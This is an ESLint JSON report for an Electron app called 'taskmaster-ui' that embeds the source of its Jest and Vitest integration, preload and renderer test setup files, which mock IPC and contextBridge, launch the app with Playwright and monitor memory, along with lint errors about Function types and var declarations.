   timestamp: Date.now(),\n      context: { type: 'unhandledRejection', promise }\n    })\n  })\n  \n  process.on('uncaughtException', (error) => {\n    integrationErrors.push({\n      test: currentTest,\n      error,\n      timestamp: Date.now(),\n      context: { type: 'uncaughtException' }\n    })\n  })\n})\n\nafterEach(async () => {\n  // Report any accumulated errors\n  if (integrationErrors.length > 0) {\n    console.warn(`âš ï¸ Integration test errors detected (${integrationErrors.length}):`)\n    integrationErrors.forEach(({ test, error, context }) => {\n      console.warn(`  - ${test}: ${error.message} (${context.type})`)\n    })\n    integrationErrors.length = 0 // Clear for next test\n  }\n  \n  // Ensure clean state between tests\n  jest.clearAllMocks()\n  jest.clearAllTimers()\n  \n  // Allow time for async cleanup\n  await new Promise(resolve => setTimeout(resolve, 100))\n})\n\n// Mock complex external dependencies for integration tests\nconst mockFileSystem = {\n  readFile: jest.fn(),\n  writeFile: jest.fn(),\n  mkdir: jest.fn(),\n  stat: jest.fn(),\n  exists: jest.fn()\n}\n\nconst mockElectronServices = {\n  ipcMain: {\n    handle: jest.fn(),\n    on: jest.fn(),\n    off: jest.fn(),\n    removeAllListeners: jest.fn()\n  },\n  BrowserWindow: jest.fn().mockImplementation(() => ({\n    loadFile: jest.fn(),\n    loadURL: jest.fn(),\n    webContents: {\n      send: jest.fn(),\n      executeJavaScript: jest.fn(),\n      on: jest.fn(),\n      once: jest.fn()\n    },\n    on: jest.fn(),\n    once: jest.fn(),\n    show: jest.fn(),\n    hide: jest.fn(),\n    close: jest.fn(),\n    destroy: jest.fn(),\n    isDestroyed: jest.fn(() => false)\n  })),\n  app: {\n    whenReady: jest.fn(() => Promise.resolve()),\n    on: jest.fn(),\n    quit: jest.fn(),\n    getPath: jest.fn(() => '/mock/path'),\n    getVersion: jest.fn(() => '1.0.0')\n  }\n}\n\n// Global test utilities for integration tests\nglobal.integrationUtils = {\n  // Async operation helpers\n  waitForAsync: async <T>(\n    operation: () => Promise<T>,\n    timeout = 30000,\n    interval = 100\n  ): Promise<T> => {\n    const start = Date.now()\n    let lastError: Error\n    \n    while (Date.now() - start < timeout) {\n      try {\n        return await operation()\n      } catch (error) {\n        lastError = error instanceof Error ? error : new Error(String(error))\n        await new Promise(resolve => setTimeout(resolve, interval))\n      }\n    }\n    \n    throw lastError || new Error(`Operation timed out after ${timeout}ms`)\n  },\n  \n  // Service mocking helpers\n  mockService: <T extends object>(service: T, overrides: Partial<T> = {}): T => {\n    const mockImplementation = {} as T\n    \n    for (const key in service) {\n      if (typeof service[key] === 'function') {\n        mockImplementation[key] = jest.fn() as any\n      } else {\n        mockImplementation[key] = service[key]\n      }\n    }\n    \n    return { ...mockImplementation, ...overrides }\n  },\n  \n  // File system test helpers\n  createTestFile: async (filePath: string, content: string) => {\n    await fs.mkdir(path.dirname(filePath), { recursive: true })\n    await fs.writeFile(filePath, content)\n  },\n  \n  cleanupTestFiles: async (basePath: string) => {\n    try {\n      await fs.rm(basePath, { recursive: true, force: true })\n    } catch {\n      // Ignore cleanup errors\n    }\n  },\n  \n  // Memory monitoring\n  getMemorySnapshot: () => {\n    const usage = process.memoryUsage()\n    return {\n      heapUsed: usage.heapUsed / 1024 / 1024, // MB\n      heapTotal: usage.heapTotal / 1024 / 1024, // MB\n      external: usage.external / 1024 / 1024, // MB\n      rss: usage.rss / 1024 / 1024 // MB\n    }\n  },\n  \n  // Network request simulation\n  simulateNetworkDelay: (ms: number = 100) => \n    new Promise(resolve => setTimeout(resolve, ms)),\n  \n  // Event simulation\n  simulateEvent: <T>(emitter: { emit: (event: string, ...args: any[]) => any }, event: string, data: T) => {\n    return new Promise<void>(resolve => {\n      setTimeout(() => {\n        emitter.emit(event, data)\n        resolve()\n      }, 0)\n    })\n  },\n  \n  // Database simulation helpers\n  createMockDatabase: () => {\n    const data = new Map()\n    return {\n      get: jest.fn((key: string) => Promise.resolve(data.get(key))),\n      set: jest.fn((key: string, value: any) => {\n        data.set(key, value)\n        return Promise.resolve()\n      }),\n      delete: jest.fn((key: string) => {\n        data.delete(key)\n        return Promise.resolve()\n      }),\n      clear: jest.fn(() => {\n        data.clear()\n        return Promise.resolve()\n      }),\n      size: () => data.size\n    }\n  }\n}\n\n// Enhanced expect matchers for integration tests\nexpect.extend({\n  toEventuallyBe(received: () => any, expected: any) {\n    return global.integrationUtils.waitForAsync(async () => {\n      const actual = await received()\n      if (actual === expected) {\n        return { pass: true, message: () => 'Values match' }\n      }\n      throw new Error(`Expected ${actual} to be ${expected}`)\n    }, 5000).then(\n      () => ({ pass: true, message: () => 'Condition eventually met' }),\n      (error) => ({ pass: false, message: () => error.message })\n    )\n  },\n  \n  toHaveBeenCalledEventually(mockFn: jest.MockedFunction<any>, timeout = 5000) {\n    return global.integrationUtils.waitForAsync(async () => {\n      if (mockFn.mock.calls.length > 0) {\n        return { pass: true, message: () => 'Function was called' }\n      }\n      throw new Error('Function not called')\n    }, timeout).then(\n      () => ({ pass: true, message: () => 'Function was eventually called' }),\n      () => ({ pass: false, message: () => 'Function was never called within timeout' })\n    )\n  }\n})\n\n// Global mocks for integration testing\nglobal.mockElectron = mockElectronServices\nglobal.mockFS = mockFileSystem\n\n// Type declarations\ndeclare global {\n  var integrationUtils: {\n    waitForAsync: <T>(operation: () => Promise<T>, timeout?: number, interval?: number) => Promise<T>\n    mockService: <T extends object>(service: T, overrides?: Partial<T>) => T\n    createTestFile: (filePath: string, content: string) => Promise<void>\n    cleanupTestFiles: (basePath: string) => Promise<void>\n    getMemorySnapshot: () => { heapUsed: number; heapTotal: number; external: number; rss: number }\n    simulateNetworkDelay: (ms?: number) => Promise<void>\n    simulateEvent: <T>(emitter: { emit: (event: string, ...args: any[]) => any }, event: string, data: T) => Promise<void>\n    createMockDatabase: () => {\n      get: jest.MockedFunction<(key: string) => Promise<any>>\n      set: jest.MockedFunction<(key: string, value: any) => Promise<void>>\n      delete: jest.MockedFunction<(key: string) => Promise<void>>\n      clear: jest.MockedFunction<() => Promise<void>>\n      size: () => number\n    }\n  }\n  \n  var mockElectron: typeof mockElectronServices\n  var mockFS: typeof mockFileSystem\n  \n  namespace jest {\n    interface Matchers<R> {\n      toEventuallyBe(expected: any): Promise<R>\n      toHaveBeenCalledEventually(timeout?: number): Promise<R>\n    }\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/setup/integration.setup.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":404,"column":39,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":404,"endColumn":47},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":405,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":405,"endColumn":49}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Integration Test Setup (2025)\n * \n * This setup file configures the testing environment for Electron integration tests.\n * It provides utilities for testing the interaction between main, renderer, and preload\n * processes, including real IPC communication and app lifecycle testing.\n * \n * Research-based implementation following 2025 best practices for:\n * - Full Electron application integration testing\n * - Real IPC communication testing patterns\n * - App lifecycle and window management testing\n * - Performance monitoring during integration tests\n */\n\nimport { vi, beforeEach, afterEach, beforeAll, afterAll } from 'vitest'\nimport { type ElectronApplication, type Page, _electron as electron } from 'playwright'\nimport { join } from 'path'\nimport { spawn, type ChildProcess } from 'child_process'\n\n// Integration test configuration (2025 best practices - extended timeouts for CI)\nconst TEST_TIMEOUT = 60000 // 60 seconds for integration tests (increased for CI)\nconst APP_STARTUP_TIMEOUT = 45000 // 45 seconds for app startup (Electron can be slow)\nconst IPC_RESPONSE_TIMEOUT = 10000 // 10 seconds for IPC responses\n\ninterface IntegrationTestContext {\n  electronApp?: ElectronApplication\n  page?: Page\n  serverProcess?: ChildProcess\n  appPath: string\n  isAppReady: boolean\n  testStartTime: number\n}\n\nconst integrationContext: IntegrationTestContext = {\n  appPath: join(__dirname, '../../dist/main/index.js'),\n  isAppReady: false,\n  testStartTime: 0\n}\n\n// Utility functions for integration testing\nexport const launchElectronApp = async (options: {\n  args?: string[]\n  executablePath?: string\n  timeout?: number\n} = {}): Promise<ElectronApplication> => {\n  const {\n    args = [],\n    executablePath,\n    timeout = APP_STARTUP_TIMEOUT\n  } = options\n\n  console.log('Launching Electron app for integration test...')\n  \n  // Ensure app is built before launching\n  const appExists = require('fs').existsSync(integrationContext.appPath)\n  if (!appExists) {\n    console.warn(`App not found at ${integrationContext.appPath}, building first...`)\n    throw new Error(`Electron app not found at ${integrationContext.appPath}. Run 'npm run build' first.`)\n  }\n  \n  const launchOptions: any = {\n    args: [integrationContext.appPath, ...args],\n    timeout\n  }\n\n  if (executablePath) {\n    launchOptions.executablePath = executablePath\n  }\n\n  try {\n    const electronApp = await electron.launch(launchOptions)\n    \n    // Wait for app to be ready\n    await electronApp.evaluate(async ({ app }) => {\n      await app.whenReady()\n    })\n    \n    integrationContext.electronApp = electronApp\n    integrationContext.isAppReady = true\n    \n    console.log('Electron app launched successfully')\n    return electronApp\n  } catch (error) {\n    console.error('Failed to launch Electron app:', error)\n    throw error\n  }\n}\n\nexport const getFirstWindow = async (): Promise<Page> => {\n  if (!integrationContext.electronApp) {\n    throw new Error('Electron app not launched. Call launchElectronApp() first.')\n  }\n\n  const page = await integrationContext.electronApp.firstWindow()\n  integrationContext.page = page\n  \n  // Wait for page to be fully loaded\n  await page.waitForLoadState('domcontentloaded', { timeout: 10000 })\n  \n  // Set up error handling for the page\n  page.on('pageerror', (error) => {\n    console.error('Page error during integration test:', error)\n  })\n  \n  page.on('console', (msg) => {\n    if (msg.type() === 'error') {\n      console.error('Console error:', msg.text())\n    }\n  })\n  \n  return page\n}\n\nexport const closeElectronApp = async (): Promise<void> => {\n  if (integrationContext.electronApp) {\n    console.log('Closing Electron app...')\n    \n    try {\n      // Close all windows first\n      const windows = integrationContext.electronApp.windows()\n      await Promise.all(windows.map(window => window.close().catch(() => {})))\n      \n      // Close the app\n      await integrationContext.electronApp.close()\n      \n      console.log('Electron app closed successfully')\n    } catch (error) {\n      console.error('Error closing Electron app:', error)\n    } finally {\n      integrationContext.electronApp = undefined\n      integrationContext.page = undefined\n      integrationContext.isAppReady = false\n    }\n  }\n}\n\nexport const startFileWatcherServer = async (): Promise<ChildProcess> => {\n  return new Promise((resolve, reject) => {\n    console.log('Starting file watcher server...')\n    \n    const serverPath = join(__dirname, '../../server/file-watcher.js')\n    const serverProcess = spawn('node', [serverPath], {\n      stdio: ['pipe', 'pipe', 'pipe'],\n      env: {\n        ...process.env,\n        NODE_ENV: 'test',\n        PORT: '3001'\n      }\n    })\n    \n    let serverStarted = false\n    \n    serverProcess.stdout?.on('data', (data) => {\n      const output = data.toString()\n      console.log('Server stdout:', output)\n      \n      if (output.includes('Server listening') && !serverStarted) {\n        serverStarted = true\n        integrationContext.serverProcess = serverProcess\n        resolve(serverProcess)\n      }\n    })\n    \n    serverProcess.stderr?.on('data', (data) => {\n      console.error('Server stderr:', data.toString())\n    })\n    \n    serverProcess.on('error', (error) => {\n      console.error('Server process error:', error)\n      reject(error)\n    })\n    \n    serverProcess.on('exit', (code) => {\n      console.log(`Server process exited with code ${code}`)\n    })\n    \n    // Timeout for server startup\n    setTimeout(() => {\n      if (!serverStarted) {\n        serverProcess.kill()\n        reject(new Error('File watcher server failed to start within timeout'))\n      }\n    }, 10000)\n  })\n}\n\nexport const stopFileWatcherServer = async (): Promise<void> => {\n  if (integrationContext.serverProcess) {\n    console.log('Stopping file watcher server...')\n    \n    return new Promise((resolve) => {\n      const server = integrationContext.serverProcess!\n      \n      server.on('exit', () => {\n        console.log('File watcher server stopped')\n        integrationContext.serverProcess = undefined\n        resolve()\n      })\n      \n      // Try graceful shutdown first\n      server.kill('SIGTERM')\n      \n      // Force kill after timeout\n      setTimeout(() => {\n        if (!server.killed) {\n          server.kill('SIGKILL')\n        }\n      }, 5000)\n    })\n  }\n}\n\nexport const waitForIPC = async (\n  electronApp: ElectronApplication,\n  channel: string,\n  timeout: number = IPC_RESPONSE_TIMEOUT\n): Promise<any> => {\n  return new Promise((resolve, reject) => {\n    const timer = setTimeout(() => {\n      reject(new Error(`IPC response for ${channel} not received within ${timeout}ms`))\n    }, timeout)\n    \n    // Set up IPC listener in main process\n    electronApp.evaluate(({ ipcMain }, { channel }) => {\n      return new Promise((resolve) => {\n        ipcMain.once(channel, (event, ...args) => {\n          resolve(args)\n        })\n      })\n    }, { channel }).then((result) => {\n      clearTimeout(timer)\n      resolve(result)\n    }).catch((error) => {\n      clearTimeout(timer)\n      reject(error)\n    })\n  })\n}\n\nexport const sendIPCToRenderer = async (\n  electronApp: ElectronApplication,\n  channel: string,\n  ...args: any[]\n): Promise<void> => {\n  await electronApp.evaluate(({ BrowserWindow }, { channel, args }) => {\n    const windows = BrowserWindow.getAllWindows()\n    if (windows.length > 0) {\n      windows[0].webContents.send(channel, ...args)\n    }\n  }, { channel, args })\n}\n\nexport const invokeIPCFromRenderer = async (\n  page: Page,\n  channel: string,\n  ...args: any[]\n): Promise<any> => {\n  return await page.evaluate(({ channel, args }) => {\n    if (window.electronAPI && window.electronAPI.invoke) {\n      return window.electronAPI.invoke(channel, ...args)\n    }\n    throw new Error('electronAPI not available')\n  }, { channel, args })\n}\n\nexport const simulateFileChange = async (filePath: string, content: string): Promise<void> => {\n  const fs = await import('fs/promises')\n  await fs.writeFile(filePath, content, 'utf-8')\n  \n  // Give the file watcher time to detect the change\n  await new Promise(resolve => setTimeout(resolve, 1000))\n}\n\nexport const measurePerformance = async (\n  electronApp: ElectronApplication\n): Promise<{\n  memory: NodeJS.MemoryUsage\n  cpu: number\n  windowCount: number\n}> => {\n  const memory = await electronApp.evaluate(async () => {\n    return process.memoryUsage()\n  })\n  \n  const windowCount = await electronApp.evaluate(({ BrowserWindow }) => {\n    return BrowserWindow.getAllWindows().length\n  })\n  \n  // Simple CPU measurement (not perfectly accurate but useful for testing)\n  const cpuUsageStart = process.cpuUsage()\n  await new Promise(resolve => setTimeout(resolve, 100))\n  const cpuUsageEnd = process.cpuUsage(cpuUsageStart)\n  const cpu = (cpuUsageEnd.user + cpuUsageEnd.system) / 100000 // Convert to percentage\n  \n  return { memory, cpu, windowCount }\n}\n\nexport const waitForElementWithTimeout = async (\n  page: Page,\n  selector: string,\n  timeout: number = 10000\n): Promise<void> => {\n  try {\n    await page.waitForSelector(selector, { timeout })\n  } catch (error) {\n    throw new Error(`Element ${selector} not found within ${timeout}ms`)\n  }\n}\n\nexport const takeScreenshot = async (\n  page: Page,\n  name: string\n): Promise<Buffer> => {\n  const screenshot = await page.screenshot({\n    path: join(__dirname, `../screenshots/${name}.png`),\n    fullPage: true\n  })\n  \n  return screenshot\n}\n\n// Memory leak detection for integration tests\nlet memoryBaseline: NodeJS.MemoryUsage\n\n// Global integration test setup\nbeforeAll(async () => {\n  console.log('Setting up integration test environment...')\n  \n  // Create screenshots directory\n  const fs = await import('fs/promises')\n  const screenshotsDir = join(__dirname, '../screenshots')\n  try {\n    await fs.mkdir(screenshotsDir, { recursive: true })\n  } catch (error) {\n    // Directory might already exist\n  }\n  \n  // Record initial memory usage\n  memoryBaseline = process.memoryUsage()\n}, 60000)\n\nbeforeEach(() => {\n  integrationContext.testStartTime = Date.now()\n  \n  // Set longer timeout for integration tests\n  vi.setConfig({ testTimeout: TEST_TIMEOUT })\n})\n\nafterEach(async () => {\n  const testDuration = Date.now() - integrationContext.testStartTime\n  \n  // Log slow tests\n  if (testDuration > TEST_TIMEOUT * 0.8) {\n    console.warn(`Slow integration test: ${testDuration}ms`)\n  }\n  \n  // Clean up any remaining app instances\n  await closeElectronApp()\n  \n  // Clean up server if running\n  await stopFileWatcherServer()\n  \n  // Force garbage collection if available\n  if (global.gc) {\n    global.gc()\n  }\n})\n\nafterAll(async () => {\n  console.log('Cleaning up integration test environment...')\n  \n  // Final cleanup\n  await closeElectronApp()\n  await stopFileWatcherServer()\n  \n  // Check for memory leaks\n  const finalMemory = process.memoryUsage()\n  const memoryGrowth = finalMemory.heapUsed - memoryBaseline.heapUsed\n  \n  if (memoryGrowth > 50 * 1024 * 1024) { // 50MB threshold\n    console.warn(`Potential memory leak in integration tests: ${Math.round(memoryGrowth / 1024 / 1024)}MB growth`)\n  }\n  \n  console.log('Integration test cleanup complete')\n}, 30000)\n\n// Error handling for integration tests\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('Unhandled Rejection in integration test:', reason)\n})\n\nprocess.on('uncaughtException', (error) => {\n  console.error('Uncaught Exception in integration test:', error)\n})\n\n// Export the integration context for advanced test scenarios\nexport { integrationContext }\n\n// Type declarations\ndeclare global {\n  interface Window {\n    electronAPI: {\n      invoke: (channel: string, ...args: any[]) => Promise<any>\n      on: (channel: string, callback: Function) => () => void\n      off: (channel: string, callback?: Function) => void\n      send: (channel: string, ...args: any[]) => void\n    }\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/setup/main.setup.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/setup/preload.setup.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":89,"column":62,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":89,"endColumn":70},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":105,"column":64,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":105,"endColumn":72},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":115,"column":74,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":115,"endColumn":82},{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":343,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":343,"endColumn":52},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":343,"column":41,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":343,"endColumn":49}],"suppressedMessages":[],"errorCount":5,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Preload Process Test Setup (2025)\n * \n * This setup file configures the testing environment for Electron's preload scripts.\n * It mocks the contextBridge and ipcRenderer APIs that are available in the preload\n * environment, ensuring secure testing of the bridge between main and renderer processes.\n * \n * Research-based implementation following 2025 best practices for:\n * - Preload script security testing patterns\n * - contextBridge API mocking strategies\n * - IPC communication validation\n * - Context isolation verification\n */\n\nimport { vi, beforeEach, afterEach } from 'vitest'\n\n// Mock contextBridge for preload script testing\nconst mockContextBridge = {\n  exposeInMainWorld: vi.fn().mockImplementation((key: string, api: any) => {\n    // Simulate the contextBridge behavior in tests\n    if (typeof global !== 'undefined') {\n      ;(global as any)[key] = api\n    }\n    \n    // Validate API structure for security\n    if (typeof api === 'object' && api !== null) {\n      for (const [methodName, method] of Object.entries(api)) {\n        if (typeof method !== 'function') {\n          console.warn(`Warning: Non-function property '${methodName}' exposed via contextBridge`)\n        }\n      }\n    }\n    \n    return true\n  }),\n  \n  // Mock for testing context isolation\n  isMainWorldIsolated: vi.fn().mockReturnValue(true),\n  \n  // Validation helper for testing\n  validateExposedAPI: vi.fn().mockImplementation((api: any) => {\n    // Simulate security validation that contextBridge performs\n    if (typeof api !== 'object' || api === null) {\n      throw new Error('API must be an object')\n    }\n    \n    // Check for prototype pollution attempts\n    if ('__proto__' in api || 'constructor' in api || 'prototype' in api) {\n      throw new Error('API contains prohibited properties')\n    }\n    \n    return true\n  })\n}\n\n// Mock ipcRenderer for preload script testing\nconst mockIpcRenderer = {\n  invoke: vi.fn().mockImplementation((channel: string, ...args: any[]) => {\n    // Mock responses based on channel for testing\n    switch (channel) {\n      case 'app:get-version':\n        return Promise.resolve('1.0.0-test')\n      case 'app:get-platform':\n        return Promise.resolve('darwin')\n      case 'dialog:show-open':\n        return Promise.resolve({ \n          canceled: false, \n          filePaths: ['/mock/test.json'] \n        })\n      case 'tasks:get-all':\n        return Promise.resolve([])\n      case 'tasks:save':\n        return Promise.resolve(true)\n      case 'window:minimize':\n        return Promise.resolve()\n      case 'security:validate-origin':\n        return Promise.resolve(true)\n      default:\n        console.warn(`Unhandled IPC channel in test: ${channel}`)\n        return Promise.resolve(null)\n    }\n  }),\n  \n  send: vi.fn().mockImplementation((channel: string, ...args: any[]) => {\n    // Log send operations for test verification\n    console.debug(`IPC send: ${channel}`, args)\n  }),\n  \n  on: vi.fn().mockImplementation((channel: string, listener: Function) => {\n    // Store listeners for cleanup and testing\n    if (!global.mockPreloadListeners) {\n      global.mockPreloadListeners = new Map()\n    }\n    \n    if (!global.mockPreloadListeners.has(channel)) {\n      global.mockPreloadListeners.set(channel, [])\n    }\n    \n    global.mockPreloadListeners.get(channel)!.push(listener)\n    \n    // Return the listener for removeListener calls\n    return listener\n  }),\n  \n  once: vi.fn().mockImplementation((channel: string, listener: Function) => {\n    // Mock once behavior\n    const wrappedListener = (...args: any[]) => {\n      listener(...args)\n      mockIpcRenderer.removeListener(channel, wrappedListener)\n    }\n    \n    return mockIpcRenderer.on(channel, wrappedListener)\n  }),\n  \n  removeListener: vi.fn().mockImplementation((channel: string, listener: Function) => {\n    if (!global.mockPreloadListeners) return\n    \n    const listeners = global.mockPreloadListeners.get(channel) || []\n    const index = listeners.indexOf(listener)\n    if (index > -1) {\n      listeners.splice(index, 1)\n    }\n  }),\n  \n  removeAllListeners: vi.fn().mockImplementation((channel?: string) => {\n    if (!global.mockPreloadListeners) return\n    \n    if (channel) {\n      global.mockPreloadListeners.delete(channel)\n    } else {\n      global.mockPreloadListeners.clear()\n    }\n  }),\n  \n  // Security-related methods for testing\n  sendSync: vi.fn().mockImplementation((channel: string, ...args: any[]) => {\n    console.warn(`sendSync called in test (should be avoided): ${channel}`)\n    return null\n  }),\n  \n  postMessage: vi.fn(),\n  \n  // For testing frame-to-frame communication\n  sendTo: vi.fn(),\n  sendToHost: vi.fn()\n}\n\n// Mock the entire Electron module for preload context\nvi.mock('electron', () => ({\n  contextBridge: mockContextBridge,\n  ipcRenderer: mockIpcRenderer,\n  \n  // Mock other APIs that might be used in preload scripts\n  webFrame: {\n    setZoomFactor: vi.fn(),\n    getZoomFactor: vi.fn().mockReturnValue(1.0),\n    setZoomLevel: vi.fn(),\n    getZoomLevel: vi.fn().mockReturnValue(0),\n    setSpellCheckProvider: vi.fn(),\n    insertCSS: vi.fn().mockReturnValue(''),\n    removeInsertedCSS: vi.fn(),\n    executeJavaScript: vi.fn().mockResolvedValue(undefined),\n    getResourceUsage: vi.fn().mockReturnValue({\n      images: { count: 0, size: 0, liveSize: 0 },\n      scripts: { count: 0, size: 0, liveSize: 0 },\n      cssStyleSheets: { count: 0, size: 0, liveSize: 0 },\n      xslStyleSheets: { count: 0, size: 0, liveSize: 0 },\n      fonts: { count: 0, size: 0, liveSize: 0 },\n      other: { count: 0, size: 0, liveSize: 0 }\n    })\n  },\n  \n  // Security features for testing\n  nativeImage: {\n    createEmpty: vi.fn(),\n    createFromPath: vi.fn(),\n    createFromBitmap: vi.fn(),\n    createFromBuffer: vi.fn(),\n    createFromDataURL: vi.fn()\n  },\n  \n  // Crash reporter for testing error handling\n  crashReporter: {\n    start: vi.fn(),\n    getLastCrashReport: vi.fn().mockReturnValue(null),\n    getUploadedReports: vi.fn().mockReturnValue([]),\n    addExtraParameter: vi.fn(),\n    removeExtraParameter: vi.fn(),\n    getParameters: vi.fn().mockReturnValue({})\n  }\n}))\n\n// Mock Node.js APIs that might be accessible in preload (but should be limited)\nvi.mock('fs', () => ({\n  // Preload scripts should have limited file system access\n  promises: {\n    readFile: vi.fn().mockRejectedValue(new Error('fs access not allowed in preload')),\n    writeFile: vi.fn().mockRejectedValue(new Error('fs access not allowed in preload'))\n  }\n}))\n\nvi.mock('path', async () => {\n  // Limited path utilities that might be safe in preload\n  const actual = await vi.importActual('path')\n  return {\n    basename: actual.basename,\n    extname: actual.extname,\n    // Block dangerous path operations\n    join: vi.fn().mockImplementation(() => {\n      throw new Error('path.join access restricted in preload')\n    }),\n    resolve: vi.fn().mockImplementation(() => {\n      throw new Error('path.resolve access restricted in preload')\n    })\n  }\n})\n\n// Security validation helpers for testing\nexport const validateContextIsolation = () => {\n  // Test that context isolation is properly configured\n  return mockContextBridge.isMainWorldIsolated()\n}\n\nexport const validateAPIExposure = (key: string, expectedAPI: any) => {\n  // Verify that APIs are properly exposed through contextBridge\n  const exposedAPI = (global as any)[key]\n  \n  if (!exposedAPI) {\n    throw new Error(`API '${key}' was not exposed`)\n  }\n  \n  // Validate API structure matches expected\n  for (const [methodName, method] of Object.entries(expectedAPI)) {\n    if (typeof exposedAPI[methodName] !== typeof method) {\n      throw new Error(`Method '${methodName}' type mismatch in exposed API`)\n    }\n  }\n  \n  return true\n}\n\nexport const simulateMainWorldMessage = (channel: string, ...args: any[]) => {\n  // Simulate a message from the main process for testing\n  const listeners = global.mockPreloadListeners?.get(channel) || []\n  listeners.forEach(listener => {\n    try {\n      listener(null, ...args) // First arg is typically the event object\n    } catch (error) {\n      console.error(`Error in preload listener for ${channel}:`, error)\n    }\n  })\n}\n\nexport const validateSecureAPI = (api: any) => {\n  // Validate that the API doesn't expose dangerous methods\n  const dangerousProps = ['__proto__', 'constructor', 'prototype', 'eval', 'Function']\n  \n  for (const prop of dangerousProps) {\n    if (prop in api) {\n      throw new Error(`Dangerous property '${prop}' found in API`)\n    }\n  }\n  \n  // Validate all exposed methods are functions\n  for (const [key, value] of Object.entries(api)) {\n    if (typeof value !== 'function') {\n      console.warn(`Non-function property '${key}' exposed in API`)\n    }\n  }\n  \n  return true\n}\n\n// Memory usage tracking for preload scripts\nlet memoryBaseline: number\n\n// Global test setup and teardown\nbeforeEach(() => {\n  // Clear all mocks before each test\n  vi.clearAllMocks()\n  \n  // Clear listener storage\n  global.mockPreloadListeners?.clear()\n  \n  // Reset context bridge state\n  if (typeof global !== 'undefined') {\n    // Clean up any previously exposed APIs\n    Object.keys(global).forEach(key => {\n      if (key.startsWith('electronAPI') || key === 'electron') {\n        delete (global as any)[key]\n      }\n    })\n  }\n  \n  // Record memory baseline\n  memoryBaseline = process.memoryUsage().heapUsed\n  \n  // Reset mock implementations\n  mockIpcRenderer.invoke.mockImplementation((channel: string, ...args: any[]) => {\n    switch (channel) {\n      case 'app:get-version':\n        return Promise.resolve('1.0.0-test')\n      case 'app:get-platform':\n        return Promise.resolve('darwin')\n      default:\n        return Promise.resolve(null)\n    }\n  })\n})\n\nafterEach(() => {\n  // Clean up listeners\n  global.mockPreloadListeners?.clear()\n  \n  // Check for memory leaks in preload scripts\n  const currentMemory = process.memoryUsage().heapUsed\n  const memoryGrowth = currentMemory - memoryBaseline\n  \n  // Log significant memory growth (threshold: 5MB for preload scripts)\n  if (memoryGrowth > 5 * 1024 * 1024) {\n    console.warn(`Potential memory leak in preload script: ${Math.round(memoryGrowth / 1024 / 1024)}MB growth`)\n  }\n  \n  // Verify no dangerous APIs were exposed\n  if (typeof global !== 'undefined') {\n    Object.keys(global).forEach(key => {\n      if (key.startsWith('electronAPI') || key === 'electron') {\n        try {\n          validateSecureAPI((global as any)[key])\n        } catch (error) {\n          console.error(`Security validation failed for exposed API '${key}':`, error)\n        }\n      }\n    })\n  }\n  \n  // Reset all mocks\n  vi.resetAllMocks()\n})\n\n// Type declarations for global additions\ndeclare global {\n  var mockPreloadListeners: Map<string, Function[]>\n}\n\nexport { mockContextBridge, mockIpcRenderer }","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/setup/setup/renderer.setup.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":65,"column":62,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":65,"endColumn":70},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":87,"column":64,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":87,"endColumn":72},{"ruleId":"no-var","severity":2,"message":"Unexpected var, use let or const instead.","line":380,"column":3,"nodeType":"VariableDeclaration","messageId":"unexpectedVar","endLine":380,"endColumn":48},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":380,"column":37,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":380,"endColumn":45},{"ruleId":"@typescript-eslint/no-namespace","severity":2,"message":"ES2015 module syntax is preferred over namespaces.","line":382,"column":3,"nodeType":"TSModuleDeclaration","messageId":"moduleSyntaxIsPreferred","endLine":386,"endColumn":4}],"suppressedMessages":[],"errorCount":5,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Renderer Process Test Setup (2025)\n * \n * This setup file configures the testing environment for Electron's renderer process.\n * It provides React Testing Library configuration, mocks Electron APIs exposed\n * through contextBridge, and sets up proper testing environment for React components.\n * \n * Research-based implementation 